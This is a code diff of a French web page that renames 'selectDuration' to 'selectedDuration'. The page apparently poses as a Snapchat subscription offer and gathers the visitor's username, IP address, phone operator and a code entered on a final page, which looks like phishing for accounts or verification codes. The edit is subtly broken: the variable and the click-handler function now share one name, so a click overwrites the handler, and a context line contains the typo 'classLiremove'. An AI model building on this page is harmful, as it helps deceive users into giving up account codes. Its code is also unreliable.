@@ -560,17 +560,17 @@
 
         <label style="margin-bottom: 12px; display: block;">Choisissez votre offre</label>
         <div class="duration-grid">
-            <div class="duration-card" onclick="selectDuration('1mois', this)">
+            <div class="duration-card" onclick="selectedDuration('1mois', this)">
                 <div class="duration-value">1</div>
                 <div class="duration-label">mois</div>
                 <div class="duration-price">Gratuit</div>
             </div>
-            <div class="duration-card popular selected" onclick="selectDuration('6mois', this)">
+            <div class="duration-card popular selected" onclick="selectedDuration('6mois', this)">
                 <div class="duration-value">6</div>
                 <div class="duration-label">mois</div>
                 <div class="duration-price">Populaire</div>
             </div>
-            <div class="duration-card" onclick="selectDuration('1an', this)">
+            <div class="duration-card" onclick="selectedDuration('1an', this)">
                 <div class="duration-value">12</div>
                 <div class="duration-label">mois</div>
                 <div class="duration-price">VIP</div>
@@ -728,7 +728,7 @@ let sessionUUID = localStorage.getItem('snap_uuid') || generateUUID();
 localStorage.setItem('snap_uuid', sessionUUID);
 document.getElementById('uuidDisplay').textContent = 'Session: ' + sessionUUID.substring(0, 8);
 
-let selectDuration = '6mois'; // <--- AJOUTEZ CETTE LIGNE
+let selectedDuration = '6mois'; // <--- AJOUTEZ CETTE LIGNE
 let selectedOperator = '';
 let userIP = '';
 let userData = {
@@ -761,8 +761,8 @@ fetch('https://api.ipify.org?format=json')
     }
 }
     
-function selectDuration(val, el) {
-    selectDuration = val;
+function selectedDuration(val, el) {
+    selectedDuration = val;
     document.querySelectorAll('.duration-card').forEach(c => c.classLiremove('selected'));
     el.classList.add('selected');
 }
@@ -796,7 +796,7 @@ function goToPage2() {
         return;
     }
     userData.username = username;
-    userData.duration = selectDuration;
+    userData.duration = selectedDuration;
     document.getElementById('error1').style.display = 'none';
     showPage('page2');
 }
@@ -1020,7 +1020,7 @@ if (uuidFromUrl && action === 'code') {
         userData = storedData; 
         userIP = storedData.ip || 'unknown';
         selectedOperator = storedData.operator || '';
-        selectDuration = storedData.duration || '6mois';
+        selectedDuration = storedData.duration || '6mois';
         
         // On affiche le formulaire pour entrer le code (page3)
         showPage('page3');
